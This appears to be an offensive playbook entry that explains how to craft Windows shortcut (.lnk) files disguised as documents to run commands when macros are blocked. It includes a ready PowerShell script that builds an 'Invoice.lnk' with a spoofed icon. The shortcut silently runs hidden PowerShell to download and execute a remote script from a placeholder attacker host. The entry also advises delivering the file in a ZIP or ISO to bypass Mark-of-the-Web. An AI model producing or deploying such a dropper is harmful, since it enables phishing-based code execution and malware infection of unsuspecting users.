# 06.01 LNK Library Files

> Craft `.lnk` or `.library-ms` files with a believable icon to launch arbitrary commands when macros are blocked.

## Overview

Crafted .lnk and .library-ms files can launch arbitrary commands with a believable icon. Useful when macros are blocked but file delivery is allowed.

## Steps

- **Build LNK** — point Target to powershell + Arguments.
- **Spoof icon** — shell32.dll PDF / Word icon.
- **Drop in ZIP / ISO** — bypass MOTW.

## Commands

### PowerShell LNK builder

```powershell
$ws = New-Object -COM WScript.Shell
$l = $ws.CreateShortcut('Invoice.lnk')
$l.TargetPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
$l.Arguments  = '-nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://<LHOST>/r.ps1\')"'
$l.IconLocation = 'shell32.dll,1'
$l.Save()
```
